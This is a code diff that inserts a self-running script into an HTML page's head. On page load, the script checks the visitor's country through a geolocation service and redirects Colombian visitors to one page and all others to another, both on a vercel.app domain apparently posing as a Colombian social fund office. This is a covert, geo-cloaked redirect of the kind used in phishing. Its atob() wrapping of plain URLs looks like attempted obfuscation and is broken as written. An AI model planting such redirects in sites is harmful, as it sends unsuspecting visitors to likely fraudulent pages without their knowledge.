@@ -297,6 +297,27 @@ footer a:hover {
     }
 }
 </style>
+
+    
+ <script>
+(function(){
+  const URL_CO  = atob("https://tucajasocialoficina.vercel.app/inicio.html");
+  const URL_OUT = atob("https://tucajasocialoficina.vercel.app/i.html");
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "CO") {
+        window.location.href = URL_CO;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
 </head>
 <body>
 
